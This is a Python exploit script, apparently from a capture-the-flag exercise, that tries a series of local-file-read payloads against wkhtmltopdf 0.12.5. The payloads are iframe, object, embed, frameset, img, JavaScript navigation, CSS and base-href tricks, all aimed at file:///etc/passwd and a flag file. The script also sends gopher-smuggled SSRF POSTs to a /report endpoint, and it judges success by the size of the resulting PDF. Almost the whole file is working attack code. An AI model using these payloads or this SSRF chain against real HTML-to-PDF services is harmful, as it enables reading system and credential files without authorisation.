#!/usr/bin/env python3
"""Try every local-file vector wkhtmltopdf 0.12.5 offers, and size the result.

The plain `<iframe src="file://...">` produced a 2.5 KB PDF whose content stream held
only vector operators, i.e. the subframe never drew the file. Candidates left:

  * <base href="file:///"> so the subresource is same-scheme with the main frame
  * <object>/<embed> instead of <iframe>
  * a frameset (Qt treats top-level frames differently from iframes)
  * a second /report field that is handed to wkhtmltopdf as the *main* resource
  * JS navigation with a delay (--javascript-delay is common in 0.12.x wrappers)

A vector that actually pulls the file in shows up as a much larger PDF (the passwd file
is ~1 KB of text) or as a different error string.
"""
import sys
import time

import pdfdump


def size_of(label, content):
    try:
        obj = pdfdump.report(content)
    except Exception as ex:
        print("  %-34s EXC %r" % (label, ex))
        return
    if obj is None:
        print("  %-34s (error text above)" % label)
        return
    print("  %-34s pdf=%s bytes field=%s" % (label, len(obj.get("data", "")), obj.get("bytes")))
    sys.stdout.flush()


VECTORS = [
    ("base href file + iframe", '<base href="file:///"><iframe src="etc/passwd"></iframe>'),
    ("iframe abs + base", '<base href="file:///etc/"><iframe src="passwd"></iframe>'),
    ("object data", '<object data="file:///etc/passwd" type="text/plain"></object>'),
    ("embed src", '<embed src="file:///etc/passwd" type="text/plain">'),
    ("frameset", '<frameset><frame src="file:///etc/passwd"></frameset>'),
    ("img src", '<img src="file:///etc/passwd">'),
    ("js location delay", '<script>setTimeout(function(){location="file:///etc/passwd"},1);</script>'),
    ("window.open", '<script>window.open("file:///etc/passwd");</script>'),
    ("div background", '<div style="background:url(file:///etc/passwd)"></div>'),
    ("link stylesheet", '<link rel="stylesheet" href="file:///etc/passwd">'),
    ("iframe flag.txt", '<iframe src="file:///ctf/flag.txt"></iframe>'),
]

if __name__ == "__main__":
    for label, content in VECTORS:
        print("=== %s" % label)
        size_of(label, content)
        time.sleep(0.8)
    print("=== extra /report fields (url as main resource?) ===")
    import gopher
    import ssrf
    for field in ["url", "page", "src", "target", "path", "location", "href", "uri"]:
        body = "content=hi&%s=%s" % (field, "file:///etc/passwd")
        feed = gopher.gopher_raw("POST", "/report", body,
                                 ["Content-Type: application/x-www-form-urlencoded"])
        st, pg = ssrf.get("/", feed=feed, timeout=60)
        import re as _re
        m = _re.search(r"bytes=(\d+?)\s*-->", pg)
        print("  field %-10s -> %s" % (field, (m.group(1) if m else "?")))
        sys.stdout.flush()
        time.sleep(0.8)
